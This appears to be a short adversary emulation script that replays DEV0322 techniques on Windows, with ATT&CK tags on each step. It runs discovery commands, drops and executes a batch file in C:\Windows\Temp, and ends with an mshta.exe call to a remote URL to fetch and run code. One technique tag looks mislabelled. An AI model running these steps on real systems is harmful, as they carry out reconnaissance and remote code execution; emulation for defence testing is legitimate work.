::Robert Roldan
::DEV0322 Adversary Emulation Plan

::T1033
cmd.exe /c whoami > whoami.txt 

::T1083
cmd.exe /c dir > dir.txt 

::T1059.003
cmd.exe /c echo whoami > C:\Windows\Temp\Serv-U.bat 

::T1033
cmd.exe /c "C:\Windows\Temp\Serv-U.bat" 

::T1059.001
powershell.exe "C:\Windows\Temp\Serv-U.bat" 

::T1281.005
C:\Windows\System32\mshta.exe http://1.1.1.1 